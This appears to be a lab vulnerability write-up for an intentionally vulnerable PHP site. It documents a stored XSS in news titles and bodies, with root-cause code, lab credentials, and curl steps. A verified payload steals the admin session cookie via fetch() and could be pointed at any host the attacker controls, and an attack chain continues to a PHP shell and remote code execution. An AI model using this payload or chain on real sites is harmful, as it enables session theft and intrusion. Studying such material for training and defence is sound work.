# 01 — Stored XSS via nyhetsrubrik/brödtext (news title and body)

- **OWASP Top 10 (2021):** A03:2021 – Injection
- **Severity:** Critical
- **Difficulty:** Easy

## Where

| Sink | File:Line | Trigger |
|------|-----------|---------|
| news body, detail page | `web/news.php:29` | `GET /news.php?id=N` |
| news title, frontpage | `web/index.php:22` | `GET /` |
| news body excerpt, frontpage | `web/index.php:20,24` | `GET /` (first 180 chars, raw) |

Writing side: `POST /panel/news_new.php` (any logged-in user, e.g. `ulla`).

## How it works (root cause)

`web/panel/news_new.php:10` stores title/body verbatim (also an SQLi, see 07):

```php
mysqli_query($db, 'INSERT INTO news (title, body, author_id, created_at) VALUES (\'' . $title . '\', \'' . $body . '\', ' . (int)$me['id'] . ', \'' . date('Y-m-d H:i:s') . '\')');
```

Read path outputs it **without `htmlspecialchars()`**:

```php
// web/index.php:20-24 (frontpage)
$excerpt = substr($n['body'], 0, 180);
echo '<h3><a href="/news.php?id=' . $n['id'] . '">' . $n['title'] . '</a></h3>';
echo '<div class="excerpt">' . $excerpt . '</div>';

// web/news.php:27-29 (detail page)
echo '<h1>' . $n['title'] . '</h1>';
echo '<div class="body">' . $n['body'] . '</div>';
```

## The victim

`tools/adminvisit.js` (started by `./osede run --adminvisit`) simulates the site's
admin: it logs in as `admin`, and every 60 s fetches `/` and the admin inbox,
**executing every `<script>` block** it finds, with the admin session cookie
attached to all `fetch()`/XHR/`Image` requests. Evidence is logged to
`data/logs/adminvisit.out.log`.

## Exploitation steps

1. Log in as `ulla` (password `Sommar2026`):

   ```bash
   curl -s -c /tmp/ulla.jar -d 'username=ulla&password=Sommar2026' \
        http://localhost:8080/login.php -o /dev/null
   ```

2. Post news whose body **starts** with a script tag (must be inside the first
   180 chars to survive the frontpage excerpt; the title is a second, easier sink):

   ```bash
   curl -s -b /tmp/ulla.jar \
     -d 'title=Xssprobe&body=<script>fetch("/?newsxss=1&c="+encodeURIComponent(document.cookie))</script> Vinterplan för poolen.' \
     http://localhost:8080/panel/news_new.php | grep -o 'Nyheten är publicerad'
   ```

3. Wait up to 60 s for the adminvisit tick, then check the evidence:

   ```bash
   grep -a 'newsxss' data/logs/adminvisit.out.log
   ```

## Working PoC (verified)

```html
<script>fetch("/?newsxss=1&c="+encodeURIComponent(document.cookie))</script>
```

The sandbox's `document.cookie` getter returns the admin cookie and the
`fetch` shim attaches it to the outgoing request, so the admin session id
arrives in your page's query string (point it anywhere you control).

## Expected result / verification

`data/logs/adminvisit.out.log` shows:

```
adminvisit: executing script on /:
fetch("/?newsxss=1&c="+encodeURIComponent(document.cookie))
adminvisit: outgoing http://localhost:8080/?newsxss=1&c=OSEDESESSID%3d... (script on /)
```

## Attack chain

```
ulla news post (stored, unescaped)
  → adminvisit renders frontpage (web/index.php:20,24 raw excerpt)
  → script executes with admin context + admin cookie
  → steal session cookie (works because cookie is not HttpOnly, see 23)
  → with the admin session: /panel/upload.php (16) → PHP shell → RCE
  (or /panel/messages.php (15/17), /api/v1/uplist (17/18), …)
```

Note: the detail page `/news.php?id=N` is *not* visited by the bot — the
frontpage excerpt is the trigger. Title-based payloads fire on the frontpage
too (`web/index.php:22`).
